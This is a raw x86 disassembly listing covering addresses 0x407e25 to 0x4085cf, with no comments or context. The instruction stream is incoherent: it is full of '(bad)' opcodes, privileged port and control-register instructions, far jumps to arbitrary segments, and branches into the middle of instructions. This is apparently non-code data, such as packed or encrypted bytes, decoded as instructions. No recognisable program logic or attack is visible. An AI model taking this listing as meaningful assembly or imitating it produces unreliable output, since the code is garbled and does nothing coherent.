  407e25:	icebp  
  407e26:	push   edi
  407e27:	aaa    
  407e28:	adc    eax,0x1f174eef
  407e2d:	and    esi,DWORD PTR [ecx+0x15]
  407e30:	inc    eax
  407e31:	mov    esi,0x577189f7
  407e36:	mov    edi,0xa56fa99
  407e3b:	add    DWORD PTR [ecx-0x728628ae],eax
  407e41:	xor    bh,ch
  407e43:	fidiv  DWORD PTR [ecx]
  407e45:	xor    dh,BYTE PTR [ebp+0x2ce2ef9b]
  407e4b:	inc    edi
  407e4c:	fwait
  407e4d:	stos   BYTE PTR es:[edi],al
  407e4e:	and    al,0x91
  407e50:	fstp   QWORD PTR [ecx-0x77]
  407e53:	and    bl,0x25
  407e56:	or     DWORD PTR [edi],eax
  407e58:	xchg   DWORD PTR [esi+0x5fb3d961],ebx
  407e5e:	das    
  407e5f:	jb     0x407e26
  407e61:	or     BYTE PTR [ecx+0x2393db8d],ah
  407e67:	and    al,0x39
  407e69:	xchg   BYTE PTR [edx-0xb],ch
  407e6c:	add    al,0x3a
  407e6e:	sbb    BYTE PTR [edx+0x1ee60841],al
  407e74:	icebp  
  407e75:	aad    0x36
  407e77:	mov    ch,0x7e
  407e79:	xor    eax,0xc5c6e81f
  407e7f:	xor    BYTE PTR [edx+esi*2],0xb6
  407e83:	retf   0x7966
  407e86:	xor    DWORD PTR [ebx+0xcd83f33],ebp
  407e8c:	sbb    al,dl
  407e8e:	push   esp
  407e8f:	mov    DWORD PTR [edx],ecx
  407e91:	xor    BYTE PTR [esi+0x69],bh
  407e94:	mov    al,0xf6
  407e96:	mov    bl,0xf6
  407e98:	fmul   st(0),st
  407e9a:	push   0x4
  407e9c:	jmp    0xef3fe70c
  407ea1:	jl     0x407edb
  407ea3:	hlt    
  407ea4:	push   esp
  407ea5:	xchg   esp,eax
  407ea6:	ja     0x407eb8
  407ea8:	jne    0x407ea1
  407eaa:	mov    ds:0x34415e09,al
  407eaf:	mov    dl,0x89
  407eb1:	rcl    DWORD PTR [ecx],cl
  407eb3:	das    
  407eb4:	adc    eax,0xfca916a3
  407eb9:	dec    eax
  407eba:	or     eax,0x3584569f
  407ebf:	jmp    0x407e5d
  407ec1:	xor    BYTE PTR [edi],al
  407ec3:	(bad)  
  407ec5:	cmp    DWORD PTR [edx+0x71f37c41],edx
  407ecb:	rol    ecx,cl
  407ecd:	mov    esi,0x790ffda8
  407ed2:	outs   dx,DWORD PTR ds:[esi]
  407ed3:	cmc    
  407ed4:	fwait
  407ed5:	pop    eax
  407ed6:	ret    
  407ed7:	out    dx,al
  407ed8:	dec    edi
  407ed9:	jbe    0x407ed1
  407edb:	mov    DWORD PTR [eax],ecx
  407edd:	pop    eax
  407ede:	jne    0x407e6a
  407ee0:	into   
  407ee1:	push   ss
  407ee2:	mov    esi,0xd9b4aad5
  407ee7:	mov    bh,dh
  407ee9:	icebp  
  407eea:	fstp   TBYTE PTR [edx+esi*4-0x77]
  407eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eef:	xchg   BYTE PTR [esi-0x4],cl
  407ef2:	(bad)  
  407ef3:	iret   
  407ef4:	ror    DWORD PTR [esp+esi*4],cl
  407ef7:	mov    ch,0xa8
  407ef9:	xchg   esp,eax
  407efa:	jnp    0x407f3c
  407efc:	lds    edi,FWORD PTR [esi-0x67]
  407eff:	enter  0x8ba,0xa6
  407f03:	cmp    BYTE PTR [ebp+0x1b],bh
  407f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f07:	mov    bh,0xf4
  407f09:	enter  0x39a4,0x96
  407f0d:	sti    
  407f0e:	mov    ecx,0x39c7aceb
  407f13:	mov    esi,ebp
  407f15:	xor    DWORD PTR [ecx+0x5c7a4fef],eax
  407f1b:	jae    0x407f8e
  407f1d:	repz loopne 0x407f7c
  407f20:	jae    0x407eb0
  407f22:	ds iret 
  407f24:	dec    esp
  407f25:	stc    
  407f26:	test   DWORD PTR [ecx],esp
  407f28:	es dec esp
  407f2a:	pop    ebx
  407f2b:	or     eax,0xb97500b9
  407f30:	mov    ah,0xf4
  407f32:	inc    ebp
  407f33:	xchg   esi,esi
  407f35:	cmc    
  407f36:	jo     0x407f77
  407f38:	das    
  407f39:	ret    
  407f3a:	pusha  
  407f3b:	ins    BYTE PTR es:[edi],dx
  407f3c:	push   0xffffffb1
  407f3e:	inc    ebx
  407f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f40:	cmovne eax,DWORD PTR [eax+0x53bea482]
  407f47:	jnp    0x407f41
  407f49:	jbe    0x407f0a
  407f4b:	xchg   esi,eax
  407f4c:	dec    eax
  407f4d:	jbe    0x407fb1
  407f4f:	dec    ecx
  407f50:	xchg   esi,eax
  407f51:	mov    esi,DWORD PTR [edx-0x2fd2c50b]
  407f57:	test   al,0xaf
  407f59:	inc    ecx
  407f5a:	xor    ebx,ebx
  407f5c:	jbe    0x407f09
  407f5e:	xchg   BYTE PTR ds:0x1a5310f7,al
  407f64:	or     BYTE PTR [esi],bl
  407f66:	sub    dl,bh
  407f68:	mov    esp,DWORD PTR [eax+0x76a19680]
  407f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f6f:	sub    BYTE PTR [edx],dl
  407f71:	jne    0x407f46
  407f73:	xor    eax,0x90f30486
  407f78:	cmp    dl,bl
  407f7a:	fadd   DWORD PTR [edx-0x512364d4]
  407f80:	repnz push ebx
  407f82:	inc    esi
  407f83:	inc    esi
  407f84:	adc    ebx,ebp
  407f86:	xchg   ecx,eax
  407f87:	cmp    DWORD PTR [ebx+eiz*1],0xffffffb5
  407f8b:	jmp    0x455f1e3f
  407f90:	mov    esp,0xf467a0cc
  407f95:	inc    ecx
  407f96:	xchg   BYTE PTR [esp+ebp*4+0x2a],cl
  407f9a:	jns    0x407f2b
  407f9c:	cmp    cl,BYTE PTR [ebx+0xd54c6e2]
  407fa2:	rol    DWORD PTR [ecx],1
  407fa4:	pusha  
  407fa5:	and    ecx,DWORD PTR [eax]
  407fa7:	push   ebp
  407fa8:	cmp    al,0x28
  407faa:	cmc    
  407fab:	mov    bh,0xe1
  407fad:	xor    BYTE PTR [eax+0x43],al
  407fb0:	dec    ecx
  407fb1:	and    al,0xa4
  407fb3:	dec    esi
  407fb4:	sub    eax,ebp
  407fb6:	add    edx,DWORD PTR [ecx-0x2f]
  407fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fba:	jecxz  0x407fad
  407fbc:	mov    DWORD PTR [edx-0x22],0xea90e634
  407fc3:	jmp    0x1238:0x48525f1d
  407fca:	inc    BYTE PTR [ecx-0x40f2fba2]
  407fd0:	in     al,0xb
  407fd2:	adc    BYTE PTR [esi-0x13],bh
  407fd5:	stos   BYTE PTR es:[edi],al
  407fd6:	retf   0xa54f
  407fd9:	mov    esi,0x157a8ddd
  407fde:	add    esi,edx
  407fe0:	mov    BYTE PTR [esi],al
  407fe2:	xchg   BYTE PTR [esi-0x4e545bc0],ch
  407fe8:	pop    ss
  407fe9:	rcl    BYTE PTR [edi-0x7],1
  407fec:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fee:	pop    ss
  407fef:	cmp    dh,BYTE PTR [eax]
  407ff1:	or     al,0x96
  407ff3:	outs   dx,BYTE PTR ds:[esi]
  407ff4:	mov    WORD PTR [esi+eax*4-0x3d],?
  407ff8:	xlat   BYTE PTR ds:[ebx]
  407ff9:	mov    ebx,esi
  407ffb:	arpl   bp,si
  407ffd:	and    eax,0xdbc4d4c1
  408002:	ins    BYTE PTR es:[edi],dx
  408003:	pop    ds
  408004:	mov    ah,0x9
  408006:	(bad)  
  408007:	das    
  408008:	add    al,0x1f
  40800a:	stos   BYTE PTR es:[edi],al
  40800b:	sbb    BYTE PTR [ebx-0x4a],bl
  40800e:	mov    fs,WORD PTR [edi]
  408010:	mov    BYTE PTR [ebx-0x4],cl
  408013:	fnstenv [ebx+0x244ba82f]
  408019:	daa    
  40801a:	jbe    0x408017
  40801c:	inc    edx
  40801d:	ins    DWORD PTR es:[edi],dx
  40801e:	iret   
  40801f:	mov    dh,0x7a
  408021:	in     al,dx
  408022:	jecxz  0x408034
  408024:	pop    esp
  408025:	lods   al,BYTE PTR ds:[esi]
  408026:	mov    dh,0xd5
  408028:	repz sub BYTE PTR [edi-0x6ea4961c],cl
  40802f:	shl    DWORD PTR [edi],1
  408031:	or     edx,DWORD PTR [ebx]
  408033:	nop
  408034:	ret    
  408035:	mov    edx,DWORD PTR [ebp+0x2d]
  408038:	cdq    
  408039:	mov    ch,0x5c
  40803b:	jb     0x40807a
  40803d:	outs   dx,BYTE PTR ds:[esi]
  40803e:	sub    ch,ch
  408040:	lods   eax,DWORD PTR ds:[esi]
  408041:	mov    WORD PTR [esi+0x1a],?
  408044:	add    edi,eax
  408046:	dec    edx
  408047:	shr    DWORD PTR [edx+0x4ad94952],cl
  40804d:	sti    
  40804e:	xor    DWORD PTR [eax+0x28],esp
  408051:	and    al,0xaf
  408053:	sar    DWORD PTR [ebx-0x616bebaa],1
  408059:	sbb    dl,BYTE PTR [ebx]
  40805b:	push   eax
  40805c:	iret   
  40805d:	push   es
  40805e:	mov    bh,0x9d
  408060:	jne    0x40802e
  408062:	sti    
  408063:	(bad)  
  408064:	jne    0x4080ac
  408066:	loope  0x4080aa
  408068:	out    dx,eax
  408069:	jg     0x408031
  40806b:	test   al,bl
  40806d:	in     al,dx
  40806e:	iret   
  40806f:	dec    ebx
  408070:	dec    ebp
  408071:	pop    esi
  408072:	mov    edx,0xa0758ace
  408077:	fsub   QWORD PTR [ebx+0x5ab297e0]
  40807d:	ffreep st(1)
  40807f:	pushf  
  408080:	add    DWORD PTR [ecx+0x4],ebx
  408083:	popa   
  408084:	fistp  DWORD PTR [edx+esi*8]
  408087:	gs cli 
  408089:	int3   
  40808a:	aam    0xa4
  40808c:	fbstp  TBYTE PTR [eax-0x32344225]
  408092:	xchg   al,ah
  408094:	inc    ecx
  408095:	push   esi
  408096:	sub    eax,0xb9b0f701
  40809b:	pop    esi
  40809c:	jmp    0xf292:0xc7c3d30f
  4080a3:	jno    0x40805b
  4080a5:	test   eax,0x9d8ca0eb
  4080aa:	push   esp
  4080ab:	sbb    ah,0x74
  4080ae:	and    eax,0x7bc1837c
  4080b3:	push   es
  4080b4:	mov    ch,BYTE PTR ds:0x6df384e7
  4080ba:	mov    esi,DWORD PTR [ecx-0x4de082e1]
  4080c0:	repz imul edi,DWORD PTR [esi],0x45
  4080c4:	test   eax,0x701f4b51
  4080c9:	dec    esi
  4080ca:	jno    0x408128
  4080cc:	mov    ch,0x32
  4080ce:	sbb    BYTE PTR [eax+0x59],bh
  4080d1:	mov    dl,0xd8
  4080d3:	test   dl,dh
  4080d5:	push   cs
  4080d6:	icebp  
  4080d7:	addr16 data16 sti 
  4080da:	mov    DWORD PTR [eax+0x7a7365a4],edx
  4080e0:	pop    es
  4080e1:	inc    ebp
  4080e2:	out    0x86,eax
  4080e4:	addr16 cli 
  4080e6:	out    dx,al
  4080e7:	test   dh,0x6b
  4080ea:	jno    0x408162
  4080ec:	in     eax,0xa
  4080ee:	push   ds
  4080ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080f0:	fidivr DWORD PTR [edi]
  4080f2:	outs   dx,DWORD PTR ds:[esi]
  4080f3:	gs xchg ebx,eax
  4080f5:	sub    eax,0x99e646fe
  4080fa:	ror    edx,1
  4080fc:	mov    bl,0x45
  4080fe:	mov    eax,DWORD PTR [esi+0x7f264966]
  408104:	mov    al,0x49
  408106:	das    
  408107:	push   cs
  408108:	retf   
  408109:	shl    DWORD PTR [edi-0x1bd747b],cl
  40810f:	jns    0x408099
  408111:	xor    eax,0x888d7b78
  408116:	mov    ebp,cs
  408118:	dec    ebp
  408119:	mov    eax,0xe23105f9
  40811e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40811f:	ins    DWORD PTR es:[edi],dx
  408120:	popa   
  408121:	enter  0x36f7,0xb6
  408125:	lods   al,BYTE PTR ds:[esi]
  408126:	lods   eax,DWORD PTR ds:[esi]
  408127:	loope  0x4080dc
  408129:	xchg   edx,eax
  40812a:	outs   dx,BYTE PTR ds:[esi]
  40812b:	pop    edi
  40812c:	in     eax,dx
  40812d:	dec    ebp
  40812e:	scas   eax,DWORD PTR es:[edi]
  40812f:	fld    QWORD PTR [edi+0x28]
  408132:	adc    bh,BYTE PTR ds:0x8face877
  408138:	or     DWORD PTR [ebx+0xf],ebp
  40813b:	popa   
  40813c:	jns    0x408165
  40813e:	mov    esi,0xebf8994c
  408143:	or     eax,0x4a373239
  408148:	jnp    0x4080f8
  40814a:	out    0xfb,eax
  40814c:	rcl    DWORD PTR [eax+0x1d5b4352],0x99
  408153:	dec    esp
  408154:	ficomp DWORD PTR [eax-0x79]
  408157:	in     eax,dx
  408158:	dec    esi
  408159:	dec    esp
  40815a:	add    ah,BYTE PTR [esi-0x22]
  40815d:	adc    DWORD PTR [esi],esp
  40815f:	(bad)  
  408160:	mov    eax,ds:0x38942780
  408165:	xor    edx,eax
  408167:	mov    ebp,0xf8a7cff1
  40816c:	pop    ebx
  40816d:	xchg   esi,eax
  40816e:	inc    edx
  40816f:	push   edi
  408170:	inc    ebp
  408171:	push   ebx
  408172:	xchg   ebx,eax
  408173:	mov    al,0xae
  408175:	addr16 push 0xffffffb6
  408178:	mov    ebx,ebx
  40817a:	xchg   bh,dh
  40817c:	clc    
  40817d:	lds    ebp,FWORD PTR [eax]
  40817f:	sbb    BYTE PTR [eax],ah
  408181:	pop    es
  408182:	test   al,0x0
  408184:	div    BYTE PTR [ecx]
  408186:	fcom   QWORD PTR [esi+0x5d]
  408189:	int    0x57
  40818b:	inc    eax
  40818c:	xor    BYTE PTR [ebp+ebx*2-0x60],dl
  408190:	mov    ah,0x3e
  408192:	and    al,0xca
  408194:	imul   eax,eax,0x26
  408197:	mov    al,ds:0x117da7d7
  40819c:	in     al,0x2f
  40819e:	mov    es,WORD PTR [edx+0x28]
  4081a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a2:	pop    edi
  4081a3:	dec    edi
  4081a4:	pop    edi
  4081a5:	pop    ebx
  4081a6:	fwait
  4081a7:	test   DWORD PTR [eax+0x20b383e0],0x4edf3a3b
  4081b1:	mov    esi,0xf42e8d44
  4081b6:	nop
  4081b7:	pop    esi
  4081b8:	adc    BYTE PTR [edi],al
  4081ba:	cs out 0xe0,eax
  4081bd:	xchg   edx,eax
  4081be:	sbb    esi,eax
  4081c0:	cmp    al,0x46
  4081c2:	jge    0x408146
  4081c4:	add    DWORD PTR [edx-0x74],edi
  4081c7:	mov    ds:0xe880caa2,al
  4081cc:	or     esi,DWORD PTR [edi]
  4081ce:	xor    DWORD PTR [edx+0x147b2410],esi
  4081d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d5:	je     0x4081b2
  4081d7:	mov    edx,0x481e2968
  4081dc:	jmp    0xbb35:0xd4bc6783
  4081e3:	xor    BYTE PTR [ecx],dl
  4081e5:	push   ss
  4081e6:	and    ecx,DWORD PTR [edi]
  4081e8:	xor    al,0xae
  4081ea:	pusha  
  4081eb:	rcr    DWORD PTR fs:[ebx+0x77366224],0x26
  4081f3:	sub    ecx,ebx
  4081f5:	jecxz  0x408245
  4081f7:	sbb    eax,0x169174b4
  4081fc:	scas   al,BYTE PTR es:[edi]
  4081fd:	test   al,0xa9
  4081ff:	call   0xeb91d07d
  408204:	shl    ch,cl
  408206:	stc    
  408207:	in     eax,dx
  408208:	rol    DWORD PTR [eax],cl
  40820a:	dec    esp
  40820b:	not    BYTE PTR [edx-0x21]
  40820e:	ficomp DWORD PTR [ebx]
  408210:	inc    edi
  408211:	ja     0x40819a
  408213:	xor    al,0x8d
  408215:	mov    WORD PTR [edx-0x357c17d1],ss
  40821b:	mov    ebp,cr7
  40821e:	ror    al,cl
  408220:	(bad)  
  408221:	pop    edx
  408222:	pushf  
  408223:	repz repz adc al,0x2e
  408227:	cwde   
  408228:	sub    al,0xe3
  40822a:	out    dx,eax
  40822b:	je     0x408244
  40822d:	sbb    eax,0x6a
  408230:	sbb    eax,0xe9afc08b
  408235:	das    
  408236:	arpl   WORD PTR [ebx+0x7c],dx
  408239:	pop    ebp
  40823a:	js     0x408220
  40823c:	jl     0x4082ae
  40823e:	stos   BYTE PTR es:[edi],al
  40823f:	inc    eax
  408240:	cmc    
  408241:	div    DWORD PTR [ecx]
  408243:	call   0xe199:0xba1bd4e6
  40824a:	mov    ds:0x44c3e02d,eax
  40824f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408250:	xor    al,0x42
  408252:	mov    DWORD PTR [ecx-0x7b],ecx
  408255:	pop    es
  408256:	inc    eax
  408257:	xchg   ebx,eax
  408258:	jnp    0x408297
  40825a:	and    bh,BYTE PTR [esi+ecx*2]
  40825d:	adc    al,0xab
  40825f:	aam    0x7b
  408261:	in     eax,dx
  408262:	mov    al,0x80
  408264:	loop   0x4081eb
  408266:	inc    edi
  408267:	and    ah,ah
  408269:	rcl    BYTE PTR [edi-0x58704cd],cl
  40826f:	add    dl,dh
  408271:	stos   BYTE PTR es:[edi],al
  408272:	hlt    
  408273:	mov    ds:0xd9c7ff32,eax
  408278:	xor    DWORD PTR [ebx-0x2edf2c91],0xffffffd0
  40827f:	scas   al,BYTE PTR es:[edi]
  408280:	shl    DWORD PTR ds:0xa64b0396,cl
  408286:	stos   DWORD PTR es:[edi],eax
  408287:	xchg   BYTE PTR [edx+0x46],al
  40828a:	sbb    bl,BYTE PTR [eax-0x7f7e26b8]
  408290:	push   ebx
  408291:	dec    edi
  408292:	xchg   ebp,eax
  408293:	dec    edx
  408294:	stos   DWORD PTR es:[edi],eax
  408295:	loop   0x408297
  408297:	pop    edi
  408298:	or     DWORD PTR [edx+esi*1-0x19f056b0],0xe5611108
  4082a3:	and    al,BYTE PTR [edx-0x15]
  4082a6:	and    BYTE PTR [eax],ch
  4082a8:	adc    BYTE PTR [ecx+0x4e8a85b9],bl
  4082ae:	mov    cl,0x55
  4082b0:	outs   dx,DWORD PTR ds:[esi]
  4082b1:	sub    esi,edx
  4082b3:	pop    ds
  4082b4:	repz popf 
  4082b6:	fstp   st(0)
  4082b8:	xor    DWORD PTR [esp+edi*4+0x7a],ecx
  4082bc:	rol    BYTE PTR [ebx],1
  4082be:	xchg   edx,eax
  4082bf:	dec    ebp
  4082c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082c1:	jl     0x4082dd
  4082c3:	cmp    BYTE PTR ds:0xc2887704,ah
  4082c9:	(bad)  
  4082ca:	cld    
  4082cb:	mov    ecx,0x4b43dd25
  4082d0:	sub    BYTE PTR [edi+0x9814a36],al
  4082d6:	mov    WORD PTR [ecx+eax*1],ds
  4082d9:	lock xor cl,BYTE PTR [ecx-0x731f5141]
  4082e0:	mov    DWORD PTR [edx+0x2b561eb6],edi
  4082e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e7:	loop   0x4082e5
  4082e9:	jno    0x408271
  4082eb:	push   cs
  4082ec:	inc    edx
  4082ed:	adc    BYTE PTR [edi-0x4028983d],al
  4082f3:	mov    ch,ah
  4082f5:	add    DWORD PTR [eax+0x4],ebp
  4082f8:	fcomp  DWORD PTR [edi-0x319b1a34]
  4082fe:	xor    edi,0xffffffcb
  408301:	xrelease mov DWORD PTR [eax+0x67],ebp
  408305:	jmp    0x408354
  408307:	xor    al,0x1e
  408309:	and    BYTE PTR [edx-0x51],dl
  40830c:	xor    al,0xff
  40830e:	mov    dl,0x33
  408310:	adc    ecx,eax
  408312:	sub    DWORD PTR [eax],esp
  408314:	jg     0x4082cd
  408316:	fs enter 0xea69,0xac
  40831b:	test   DWORD PTR [ecx],ebx
  40831d:	sbb    ch,BYTE PTR [edx]
  40831f:	les    ebx,FWORD PTR [ecx]
  408321:	pop    esi
  408322:	call   0x82f46f94
  408327:	mov    edx,0xc866cd1e
  40832c:	outs   dx,DWORD PTR ds:[esi]
  40832d:	and    al,0xd4
  40832f:	daa    
  408330:	jecxz  0x4083af
  408332:	shl    esi,0x41
  408335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408336:	shl    DWORD PTR [esi+0x163dd1f4],1
  40833c:	int3   
  40833d:	fist   WORD PTR [ebx-0x18]
  408340:	lods   eax,DWORD PTR ds:[esi]
  408341:	and    edi,esi
  408343:	shr    DWORD PTR [edx+0x18],0x16
  408347:	mov    eax,eax
  408349:	inc    ebp
  40834a:	sub    esp,ebp
  40834c:	hlt    
  40834d:	xchg   esi,eax
  40834e:	and    al,cl
  408350:	popa   
  408351:	leave  
  408352:	popa   
  408353:	sbb    BYTE PTR ds:0xf813c252,ah
  408359:	dec    ebp
  40835a:	addr16 ss dec eax
  40835d:	or     eax,0x48884de0
  408362:	xchg   edi,eax
  408363:	sbb    BYTE PTR [edx],dl
  408365:	xchg   edx,eax
  408366:	xchg   ecx,eax
  408367:	or     ebx,eax
  408369:	sub    al,0xe5
  40836b:	xchg   edx,eax
  40836c:	push   ebx
  40836d:	xchg   ebp,eax
  40836e:	or     eax,0x9a0e2e62
  408373:	and    ebx,edx
  408375:	inc    esp
  408376:	lea    edx,[esi]
  408378:	cwde   
  408379:	retf   0x78db
  40837c:	xchg   ebx,eax
  40837d:	pop    edi
  40837e:	aaa    
  40837f:	push   es
  408380:	shl    ebx,1
  408382:	inc    edi
  408383:	pop    ds
  408384:	ins    DWORD PTR es:[edi],dx
  408385:	rcr    BYTE PTR [edi+eax*4-0xdd57c44],0xc9
  40838d:	mov    cl,0x6f
  40838f:	and    al,0x75
  408391:	fist   DWORD PTR [esp+eax*2+0x3bcb907d]
  408398:	jb     0x408397
  40839a:	or     al,ah
  40839c:	ins    BYTE PTR es:[edi],dx
  40839d:	aaa    
  40839e:	cmp    DWORD PTR [edi+edx*1+0x4f],esp
  4083a2:	mov    ebx,esp
  4083a4:	push   esp
  4083a5:	mov    cl,0x14
  4083a7:	add    eax,0xc9e7abc5
  4083ac:	add    al,0x7e
  4083ae:	(bad)  
  4083af:	es mov ch,0x39
  4083b2:	or     BYTE PTR [ecx],cl
  4083b4:	dec    esp
  4083b5:	rcl    BYTE PTR [edi+0x30],cl
  4083b8:	jmp    0xba5ec11f
  4083bd:	sub    ecx,ecx
  4083bf:	or     al,0x51
  4083c1:	stc    
  4083c2:	sub    bl,BYTE PTR [ebx+0x75]
  4083c5:	bound  esp,QWORD PTR [esi-0x95e18e3]
  4083cb:	ins    BYTE PTR es:[edi],dx
  4083cc:	pop    eax
  4083cd:	ss inc esi
  4083cf:	aam    0x70
  4083d1:	or     ebx,DWORD PTR [ebx+0x554cae67]
  4083d7:	and    DWORD PTR [edi+esi*1],esp
  4083da:	imul   edi,DWORD PTR [ebx],0x276d4cbf
  4083e0:	imul   ecx,DWORD PTR ds:0xe8d1b381,0xffffff94
  4083e7:	dec    edi
  4083e8:	ret    
  4083e9:	sahf   
  4083ea:	outs   dx,DWORD PTR ds:[esi]
  4083eb:	push   ebp
  4083ec:	jp     0x408407
  4083ee:	sub    esi,ecx
  4083f0:	js     0x40839f
  4083f2:	and    cl,bh
  4083f4:	jp     0x4083bd
  4083f6:	inc    esp
  4083f7:	rcl    bl,0x4c
  4083fa:	pop    es
  4083fb:	int    0x73
  4083fd:	push   edx
  4083fe:	das    
  4083ff:	aam    0x4c
  408401:	xchg   ecx,eax
  408402:	pop    es
  408403:	mov    al,0x8c
  408405:	in     eax,0x3d
  408407:	js     0x4083e7
  408409:	push   edx
  40840a:	movhps QWORD PTR [edi],xmm4
  40840d:	xlat   BYTE PTR ds:[ebx]
  40840e:	xor    al,BYTE PTR [ebx]
  408410:	push   ebx
  408411:	pop    ecx
  408412:	xchg   edi,eax
  408413:	xor    BYTE PTR [esp+edx*1+0xb],bl
  408417:	xchg   ecx,eax
  408418:	mov    ebx,ebx
  40841a:	and    al,0xf8
  40841c:	aas    
  40841d:	stos   DWORD PTR es:[edi],eax
  40841e:	sbb    dl,BYTE PTR [ecx+0x4e]
  408421:	add    eax,0xa2ce1e91
  408426:	jmp    0xca4b:0x78a3859
  40842d:	jmp    0xf254e9f0
  408432:	(bad)  
  408433:	push   esp
  408434:	push   esi
  408435:	or     al,0xd9
  408437:	in     al,0x1
  408439:	js     0x40843b
  40843b:	xor    DWORD PTR gs:[ebx+0x63285b5],edx
  408442:	ds cmc 
  408444:	fwait
  408445:	cmp    eax,0xaa3d0274
  40844a:	add    DWORD PTR [esi],edx
  40844c:	js     0x40840d
  40844e:	jae    0x4084b0
  408450:	xor    DWORD PTR ds:0x291b9d6f,eax
  408456:	das    
  408457:	or     al,0x87
  408459:	cmp    esp,ecx
  40845b:	mov    ds:0xa85a9798,eax
  408460:	jge    0x6098e550
  408466:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  408468:	imul   ecx,DWORD PTR [ecx+eiz*1-0x4c],0x6a
  40846d:	add    ebp,DWORD PTR [ecx-0x4a]
  408470:	addr16 mov ebx,0xac349091
  408476:	fld    DWORD PTR [edi+0x1c]
  408479:	in     al,dx
  40847a:	mov    ebp,DWORD PTR [esi]
  40847c:	or     eax,0xa21ccef4
  408481:	xor    eax,0x2a57ab2
  408486:	xchg   DWORD PTR [edx-0x600c2c84],edx
  40848c:	out    0xc8,al
  40848e:	and    ch,BYTE PTR [esi-0xb231332]
  408494:	imul   eax,DWORD PTR ds:0x10558948,0xb20a5cd5
  40849e:	cmp    esi,DWORD PTR [ecx-0x8]
  4084a1:	pop    ss
  4084a2:	mov    ds:0x627454b9,al
  4084a7:	jnp    0x408518
  4084a9:	fcom   DWORD PTR [edi+edx*1-0x7b106b3f]
  4084b0:	dec    esi
  4084b1:	lods   eax,DWORD PTR ds:[esi]
  4084b2:	je     0x4084f7
  4084b4:	cdq    
  4084b5:	xor    al,0x3c
  4084b7:	out    0x66,eax
  4084b9:	lods   eax,DWORD PTR ds:[esi]
  4084ba:	dec    edx
  4084bb:	mov    eax,0x2e4b9db0
  4084c0:	sbb    eax,0x3e6e82f8
  4084c5:	das    
  4084c6:	cs js  0x408499
  4084c9:	fcomp  DWORD PTR [esi-0x4e]
  4084cc:	adc    al,0xcc
  4084ce:	imul   ecx,DWORD PTR [ebp+0x5b],0xffffff9a
  4084d2:	mov    DWORD PTR [edx-0x4],esi
  4084d5:	xor    cl,BYTE PTR [eax+0x650a7af7]
  4084db:	and    eax,0x4ba7b80a
  4084e0:	sub    DWORD PTR [edi+0x5ee9ba0d],ecx
  4084e6:	out    0xe7,eax
  4084e8:	cmp    edx,esp
  4084ea:	sahf   
  4084eb:	cmc    
  4084ec:	or     eax,DWORD PTR [esp+0x30]
  4084f0:	jae    0x4084ce
  4084f2:	dec    ebp
  4084f3:	std    
  4084f4:	inc    edi
  4084f5:	cmp    ebp,0x37068bcf
  4084fb:	pop    ss
  4084fc:	sbb    dh,dl
  4084fe:	shl    DWORD PTR [esi-0x242ee15e],1
  408504:	(bad)  
  408505:	sbb    bh,BYTE PTR [esi+0x2d]
  408508:	mov    cl,0x8b
  40850a:	mov    WORD PTR [ebp-0x1a],ss
  40850d:	(bad)
  408511:	sub    esi,esi
  408513:	jno    0x408537
  408515:	push   0xaa2ba92c
  40851a:	arpl   WORD PTR [esi+0x58],bp
  40851d:	(bad)  
  40851e:	mov    ecx,0x221ae935
  408523:	jno    0x408510
  408525:	adc    cl,BYTE PTR [esi+0x5e81781a]
  40852b:	enter  0xaaa3,0xb0
  40852f:	jmp    0xb07f:0x1303637c
  408536:	in     eax,dx
  408537:	icebp  
  408538:	cwde   
  408539:	push   ds
  40853a:	push   eax
  40853b:	jp     0x4085b2
  40853d:	mov    al,ds:0x837169de
  408542:	stc    
  408543:	retf   0x535e
  408546:	mov    ah,0xe
  408548:	scas   al,BYTE PTR es:[edi]
  408549:	jbe    0x408571
  40854b:	sahf   
  40854c:	dec    eax
  40854d:	pop    ebp
  40854e:	sbb    ch,ch
  408550:	adc    DWORD PTR [ecx+0x488a6292],ebx
  408556:	test   al,0x5
  408558:	out    0x10,al
  40855a:	mov    cl,0x5c
  40855c:	pop    eax
  40855d:	ja     0x408586
  40855f:	or     BYTE PTR [edx],dh
  408561:	sbb    ch,dl
  408563:	or     al,0x31
  408565:	out    0xa3,eax
  408567:	fmulp  st(1),st
  408569:	mov    WORD PTR [ecx-0x3cf8d219],cs
  40856f:	xlat   BYTE PTR ds:[ebx]
  408570:	mov    esi,0xfa7f2a72
  408575:	dec    eax
  408576:	test   edx,ecx
  408578:	sbb    DWORD PTR [edi-0x17],0x8643c1d5
  40857f:	scas   eax,DWORD PTR es:[edi]
  408580:	pop    ebx
  408581:	push   ebx
  408582:	and    BYTE PTR [edi+0x318a7be8],dl
  408588:	dec    ebp
  408589:	mov    ds:0x855a7990,al
  40858e:	sbb    eax,0xc3c6bbc
  408593:	fist   WORD PTR ds:0x6f06b286
  408599:	inc    ebp
  40859a:	cmp    BYTE PTR [edx-0x3a],0xe
  40859e:	or     al,0xf3
  4085a0:	mov    ebp,0xe1be527c
  4085a5:	xchg   ebx,eax
  4085a6:	ret    0x5e42
  4085a9:	nop
  4085aa:	outs   dx,DWORD PTR ds:[esi]
  4085ab:	mov    eax,ds:0xf6610eac
  4085b0:	adc    edi,DWORD PTR [ebx+edi*2+0x4b33455c]
  4085b7:	sbb    al,ch
  4085b9:	and    al,0xec
  4085bb:	push   edx
  4085bc:	not    DWORD PTR ds:0xa4ab051a
  4085c2:	loopne 0x40860d
  4085c4:	push   0xa130dfe0
  4085c9:	repnz mov al,ds:0x50a38655
  4085cf:	and    cl,BYTE PTR [ebp-0xc407552]
